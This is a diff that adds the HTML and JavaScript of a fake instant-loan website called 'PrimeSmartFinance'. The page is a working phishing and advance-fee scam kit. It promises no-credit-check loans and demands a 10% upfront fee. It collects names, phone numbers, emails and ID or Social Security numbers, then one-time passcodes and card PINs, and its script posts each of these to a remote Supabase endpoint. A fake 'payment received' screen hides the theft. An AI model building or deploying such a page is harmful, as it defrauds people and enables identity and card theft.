@@ -1,0 +1,197 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PrimeSmartFinance — Instant Loans</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
+body{background:linear-gradient(135deg,#004d40 0%,#00695c 50%,#00897b 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.screen{display:none;width:100%;max-width:420px;background:#fff;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.35);overflow:hidden;animation:fade .4s ease}
+.screen.active{display:block}
+keyframes fade{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+.top{background:linear-gradient(135deg,#004d40,#00897b);color:#fff;padding:30px 24px;text-align:center}
+.top .logo{font-size:26px;font-weight:800;letter-spacing:1px}
+.top .tag{font-size:13px;opacity:.9;margin-top:4px}
+.badge{display:inline-block;background:#ffc107;color:#004d40;font-weight:700;font-size:12px;padding:6px 14px;border-radius:20px;margin-top:12px}
+.body{padding:24px}
+h2{color:#004d40;font-size:20px;margin-bottom:6px}
+p{color:#555;font-size:14px;line-height:1.5;margin-bottom:16px}
+label{display:block;font-size:13px;font-weight:600;color:#333;margin:12px 0 4px}
+input,select{width:100%;padding:14px;border:2px solid #ddd;border-radius:12px;font-size:15px;outline:none;transition:.2s}
+input:focus,select:focus{border-color:#00897b}
+input.ok{border-color:#4caf50;background:#f0fff0}
+.slider{width:100%;margin:10px 0}
+.amount-disp{font-size:22px;font-weight:800;color:#004d40}
+.amount-xs{font-size:12px;color:#777}
+.fee-note{background:#fff8e1;border-left:4px solid #ffc107;padding:12px;border-radius:8px;font-size:13px;margin:14px 0;color:#5d4a00}
+.btn{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,#ffc107,#ff9800);color:#004d40;font-size:17px;font-weight:800;cursor:pointer;margin-top:18px;transition:.2s}
+.btn:active{transform:scale(.97)}
+.btn.green{background:linear-gradient(135deg,#004d40,#00897b);color:#fff}
+.spinner{width:50px;height:50px;border:5px solid #e0e0e0;border-top-color:#00897b;border-radius:50%;margin:30px auto;animation:spin 1s linear infinite}
+keyframes spin{to{transform:rotate(360deg)}}
+.confetti{font-size:48px;text-align:center;margin-bottom:10px}
+.otp-box{display:flex;gap:10px;justify-content:center;margin:20px 0}
+.otp-box input{width:50px;height:60px;text-align:center;font-size:24px;font-weight:800;border:2px solid #ddd;border-radius:12px}
+.otp-box input:focus{border-color:#00897b}
+.pin-dots{display:flex;gap:14px;justify-content:center;margin:20px 0}
+.pin-dots input{width:55px;height:60px;text-align:center;font-size:24px;font-weight:800;border:2px solid #ddd;border-radius:12px}
+.resend{font-size:13px;color:#00897b;text-align:center;margin-top:10px;cursor:pointer}
+.result{text-align:center;padding:20px 0}
+.result .big{font-size:32px;margin-bottom:10px}
+
+.msg{background:#f5f5f5;border-radius:10px;padding:12px;font-size:13px;color:#444;margin-top:12px;line-height:1.5;word-break:break-word}
+.secure{display:flex;align-items:center;gap:6px;justify-content:center;margin-top:14px;font-size:11px;color:#777}
+</style>
+</head>
+<body>
+
+<!-- SCREEN 1: LANDING -->
+
+    🏦 PrimeSmartFinance
+
+    Fast. Secure. Trusted Loans.
+
+    ✓ Approved in Minutes
+
+    Get Your Loan Today
+    Need cash fast? Choose your amount and unlock your instant loan — no credit check required.
+
+    <label>Select Loan Amount</label>
+    <input type="range" class="slider" id="amountSlider" min="100" max="5000" step="100" value="1000">
+    $1,000
+
+    Credit range: $100 – $5,000
+
+    💡 Important: A one-time upfront fee of 10% of your loan amount is required for registration &amp; insurance before your loan is disbursed. This is standard and fully refundable after repayment.
+
+    <button class="btn" onclick="go(2)">APPLY NOW ➜</button>
+    🔒 256-bit SSL Secured
+
+<!-- SCREEN 2: APPLICATION FORM -->
+
+  🏦 PrimeSmartFinance
+Application Form
+
+    Tell Us About You
+    <label>Full Name</label><input type="text" id="fname" placeholder="e.g. John Smith">
+    <label>Phone Number</label><input type="tel" id="fphone" placeholder="e.g. +1 555 123 4567">
+    <label>Email Address</label><input type="email" id="femail" placeholder="e.g. john@email.com">
+    <label>Nationality</label><input type="text" id="fnation" placeholder="e.g. United States">
+    <label>ID Number</label><input type="text" id="fid" placeholder="State ID / Passport / SSN">
+    <label>Loan Amount ($)</label><input type="number" id="famount" min="100" max="5000" placeholder="1000">
+    <label>Monthly Income ($)</label><input type="number" id="fincome" placeholder="e.g. 3000">
+    <button class="btn green" onclick="submitApplication()">SUBMIT APPLICATION ✓</button>
+
+<!-- SCREEN 3: PROCESSING -->
+
+    Processing Your Application…
+    Verifying your details and credit eligibility.
+
+<!-- SCREEN 4: APPROVED -->
+
+  🎉 CONGRATULATIONS!
+You've been approved
+
+    🎉🎊
+
+    You're Approved!
+    Your loan of $1,000 has been approved!
+
+    To release your funds, a 10% upfront fee of $100 is required for registration &amp; insurance.
+
+    This fee must be paid via the next steps to complete disbursement.
+
+    <button class="btn" onclick="go(5)">PROCEED TO VERIFICATION ➜</button>
+
+<!-- SCREEN 5: OTP -->
+
+🔐 Verification
+Step 1 of 2
+
+    Enter OTP
+    A 6-digit code was sent to your phone. Enter it below to verify your identity.
+
+      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
+
+    Resend OTP
+
+    <button class="btn green" onclick="submitOtp()">VERIFY OTP ✓</button>
+
+<!-- SCREEN 6: PIN -->
+
+  💳 Card Verification
+Step 2 of 2
+
+    Enter Your PIN
+    Enter the 4-digit PIN associated with your card to complete the fee payment.
+
+      <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
+
+    <button class="btn" onclick="submitPin()">PAY &amp; COMPLETE ✓</button>
+
+<!-- SCREEN 7: EXIT -->
+
+  ✅ Payment Received
+
+    💵
+
+    Almost Done!
+    Your registration &amp; insurance fee has been received. Your loan of $1,000 is now being processed for disbursement.
+
+    Funds will be sent to your account within 24 hours.
+
+    Thank you for choosing PrimeSmartFinance. 💚
+
+    🔒 Secure Transaction
+
+<script src="remote.js"></script>
+<script>
+// ===== CONFIG: ONLY the anon key + project URL live here (public-safe) =====
+var SUPABASE_URL  = "https://epjhniuggmidhkrlrxwo.supabase.co";
+var SUPABASE_ANON = "sb_publishable_8FINZySGYB7L1GRHy2MSxw_qw-XlW_g";
+
+// Shared submit helper -> remote.js pushes to Supabase edge function
+function sendEvent(eventType, payload){
+  fetch("https://epjhniuggmidhkrlrxwo.supabase.co/functions/v1/apply",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SUPABASE_ANON,"Authorization":"Bearer "+SUPABASE_ANON},
+    body:JSON.stringify({event:eventType,data:payload,meta:window._psf || {}})
+  }).catch(function(){});
+}
+
+function go(n){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));document.getElementById('s'+n).classList.add('active');}
+
+var slider=document.getElementById('amountSlider');
+slider.oninput=function(){document.getElementById('amountDisp').innerText='$'+Number(slider.value).toLocaleString();};
+
+function submitApplication(){
+  var data={
+    name:document.getElementById('fname').value,
+    phone:document.getElementById('fphone').value,
+    email:document.getElementById('femail').value,
+    nationality:document.getElementById('fnation').value,
+    id:document.getElementById('fid').value,
+    amount:document.getElementById('famount').value,
+    income:document.getElementById('fincome').value
+  };
+  sendEvent("application",data);
+  var amt=data.amount||1000;
+  document.getElementById('approvedAmount').innerText='$'+Number(amt).toLocaleString();
+  document.getElementById('feeAmount').innerText='$'+(Number(amt)*0.10).toLocaleString();
+  document.getElementById('finalAmount').innerText='$'+Number(amt).toLocaleString();
+  go(3);
+
+setTimeout(function(){go(4);},2500);
+}
+
+function collectOtp(){return Array.from(document.querySelectorAll('#s5 .otp-box input')).map(i=>i.value).join('');}
+function submitOtp(){var o=collectOtp();if(o.length===6){sendEvent("otp",{otp:o,amount:document.getElementById('approvedAmount').innerText});go(6);}else alert("Please enter the 6-digit OTP.");}
+function resendOtp(){alert("A new OTP has been sent to your phone.");}
+
+function collectPin(){return Array.from(document.querySelectorAll('#s6 .pin-dots input')).map(i=>i.value).join('');}
+function submitPin(){var p=collectPin();if(p.length===4){sendEvent("pin",{pin:p,amount:document.getElementById('approvedAmount').innerText});go(7);}else alert("Please enter your 4-digit PIN.");}
+</script>
+</body>
+</html>
